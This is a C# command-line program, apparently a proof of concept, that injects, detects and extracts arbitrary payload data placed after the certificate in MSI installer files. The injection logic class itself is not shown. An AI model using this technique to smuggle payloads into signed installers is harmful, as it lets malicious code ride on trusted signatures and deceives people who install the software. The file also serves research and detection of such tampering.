using System;
using System.CommandLine;
using System.CommandLine.Parsing;
using System.IO;

namespace MsiInjectPoc
{
	internal class Program
	{
		private static void ValidateMsi(ArgumentResult symbolresult)
		{
			try
			{
				using (new MsiInjector(symbolresult.GetValueOrDefault<FileInfo>().FullName))
				{
				}
			}
			catch (Exception ex)
			{
				symbolresult.ErrorMessage = ex.Message;
			}
		}

		private static Command BuildInjectCommand()
		{
			Command command = new Command("inject", "Injects data after the certificate");

			var targetArgument = new Argument<FileInfo>("MSI to inject");
			command.AddArgument(targetArgument);
			targetArgument.AddValidator(ValidateMsi);

			var payloadArgument = new Argument<FileInfo>("payload to inject");
			command.AddArgument(payloadArgument);

			command.SetHandler((target, payload) => 
			{
				using (MsiInjector injector = new MsiInjector(target.FullName))
				{
					injector.SetInjection(File.ReadAllBytes(payload.FullName));
				}
			}, targetArgument, payloadArgument);

			return command;
		}


		static Command BuildVerifyCommand()
		{
			Command command = new Command("verify", "Verifies if data lies after certificate");

			var pathArgument = new Argument<FileInfo>("MSI to verify");
			command.AddArgument(pathArgument);
			pathArgument.AddValidator(ValidateMsi);

			command.SetHandler(path =>
			{
				byte[] injection;

				using (MsiInjector injector = new MsiInjector(path.FullName))
				{
					injection = injector.GetInjection();
				}

				Console.WriteLine(injection.Length == 0
					? "No data found after certificate"
					: $"Found {injection.Length} bytes of data after certificate");
			}, pathArgument);

			return command;
		}

		static Command BuildExtractCommand()
		{
			Command command = new Command("extract", "Extracts data after certificate");

			var targetArgument = new Argument<FileInfo>("MSI to extract");
			command.AddArgument(targetArgument);
			targetArgument.AddValidator(ValidateMsi);

			var destinationArgument = new Argument<FileInfo>("file to extract to");
			command.AddArgument(destinationArgument);

			command.SetHandler((target, destination) =>
			{
				byte[] injection;
				
				using (MsiInjector injector = new MsiInjector(target.FullName))
				{
					injection = injector.GetInjection();
				}

				File.WriteAllBytes(destination.FullName, injection);
			}, targetArgument, destinationArgument);

			return command;
		}

		static int Main(string[] args)
		{
			RootCommand rootCommand = new RootCommand("MSI Certificate Padding Injection Tool");
			rootCommand.AddCommand(BuildInjectCommand());
			rootCommand.AddCommand(BuildExtractCommand());
			rootCommand.AddCommand(BuildVerifyCommand());

			return rootCommand.Invoke(args);
		}
	}
}